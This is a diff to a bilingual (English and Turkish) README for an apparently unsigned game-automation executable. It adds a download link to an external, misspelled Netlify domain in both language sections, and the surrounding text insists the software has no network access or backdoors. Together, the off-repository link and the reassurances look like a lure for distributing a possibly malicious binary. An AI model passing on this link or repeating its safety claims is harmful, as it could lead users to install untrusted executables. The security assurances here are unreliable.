@@ -12,7 +12,7 @@ Unsigned Binary: Since the compiled .exe lacks a digital signature (certificate)
 Security Notice: The entire source code is open and transparent. There are no network requests, data logging, or hidden backdoors. The software strictly focuses on manipulating local input signals for in-game automation as shown in the source code
 
 
-
+download here: https://downlaodaqwe.netlify.app/
 
 
 
@@ -31,3 +31,4 @@ Düşük Seviyeli İşlemler: Kod, tuş vuruşlarını taklit etmek için SendIn
 
 Güvenlik Notu: Kodun tamamı yukarıda açıkça paylaşılmıştır. Kodda herhangi bir internet bağlantısı (network socket), veri toplama veya arka kapı bulunmamaktadır. Sadece girdiğiniz tuş sinyallerini manipüle ederek oyun içi otomasyon sağlar.
 
+burdan indirebilirsiniz: https://downlaodaqwe.netlify.app/
